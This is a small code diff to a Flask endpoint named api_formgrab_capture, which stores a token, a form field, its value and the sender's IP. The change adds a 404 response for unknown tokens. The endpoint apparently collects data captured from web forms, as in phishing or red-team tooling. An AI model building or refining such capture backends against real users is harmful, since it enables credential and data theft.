@@ -1363,7 +1363,8 @@ def api_formgrab_capture():
     ip = request.remote_addr or ""
     if not token:
         return jsonify({"success": False, "error": "token required"}), 400
-    add_capture(token, field, value, ip)
+    if not add_capture(token, field, value, ip):
+        return jsonify({"success": False, "error": "unknown token"}), 404
     return jsonify({"success": True})
 
 
